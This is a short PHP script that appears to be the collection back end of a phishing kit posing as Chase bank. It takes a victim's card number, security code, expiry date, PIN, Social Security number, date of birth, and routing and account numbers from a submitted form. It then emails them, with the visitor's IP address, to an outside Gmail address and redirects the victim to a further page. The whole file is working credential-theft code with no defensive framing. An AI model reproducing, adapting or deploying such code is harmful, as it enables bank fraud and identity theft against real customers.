<?

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate= date("D M d, Y g:i a");
$card_number = $_POST['card_number'];
$csc = $_POST['csc'];
$expdate_month = $_POST['expdate_month'];
$expdate_year = $_POST['expdate_year'];
$pin = $_POST['pin'];
$ssn1 = $_POST['ssn1'];
$ssn2 = $_POST['ssn2'];
$ssn3 = $_POST['ssn3'];
$mm = $_POST['mm'];
$dd = $_POST['dd'];
$yy = $_POST['yy'];
$routing_number = $_POST['routing_number'];
$account_number = $_POST['account_number'];


//Twichiya Dial  E-Mail   
$subj = "Chase Card INfO' $card_number ";
$msg = " ---------------------  \nCard number: $card_number\ncard verification Number: $csc\nExpiry date: $expdate_month-$expdate_year\nPin: $pin\nSSN: $ssn1-$ssn2-$ssn3\nDOB mm-dd-YY: $mm-$dd-$yy\nRouting number: $routing_number\nAccount number: $account_number\nIP: $ip\nDate: $adddate\n ------------------- ";
mail("fittedtosign@gmail.com", $subj, $msg);
mail("$cc", $subj, $msg);
header("Location:personal_info.htm");
?>